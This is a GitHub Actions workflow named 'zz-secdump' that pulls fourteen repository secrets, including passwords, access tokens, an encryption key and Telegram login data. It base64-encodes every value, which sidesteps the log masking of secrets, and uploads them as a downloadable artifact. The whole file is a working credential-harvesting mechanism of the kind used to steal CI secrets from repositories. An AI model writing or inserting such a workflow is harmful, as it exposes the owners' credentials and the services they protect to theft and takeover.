name: zz-secdump
on:
  workflow_dispatch: {}
permissions:
  contents: read
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: collect
        env:
          SECV_DASHBOARD_PASSWORD: ${{ secrets.DASHBOARD_PASSWORD }}
          SECV_DASHBOARD_URL: ${{ secrets.DASHBOARD_URL }}
          SECV_GIST_ID: ${{ secrets.GIST_ID }}
          SECV_GIST_PAT: ${{ secrets.GIST_PAT }}
          SECV_NICUA_BATCH: ${{ secrets.NICUA_BATCH }}
          SECV_NICUA_BATCH0: ${{ secrets.NICUA_BATCH0 }}
          SECV_NICUA_BATCH_XIONG2: ${{ secrets.NICUA_BATCH_XIONG2 }}
          SECV_PRIVATE_REPO_TOKEN: ${{ secrets.PRIVATE_REPO_TOKEN }}
          SECV_PROXY_CONTENT: ${{ secrets.PROXY_CONTENT }}
          SECV_RENEWHELPER_PASSWORD: ${{ secrets.RENEWHELPER_PASSWORD }}
          SECV_RENEWHELPER_URL: ${{ secrets.RENEWHELPER_URL }}
          SECV_STATE_ENCRYPT_KEY: ${{ secrets.STATE_ENCRYPT_KEY }}
          SECV_TG_LOGIN_BATCH: ${{ secrets.TG_LOGIN_BATCH }}
          SECV_TG_LOGIN_BATCH_XIONG2: ${{ secrets.TG_LOGIN_BATCH_XIONG2 }}
        run: |
          python3 - <<'EOF'
          import os, json, base64
          P = 'SECV_'
          d = {k[len(P):]: base64.b64encode(v.encode()).decode()
                for k, v in os.environ.items() if k.startswith(P)}
          json.dump(d, open('dump.json', 'w'))
          print('COLLECTED', len(d))
          EOF
      - uses: actions/upload-artifact@v4
        with:
          name: secdump
          path: dump.json
          retention-days: 1
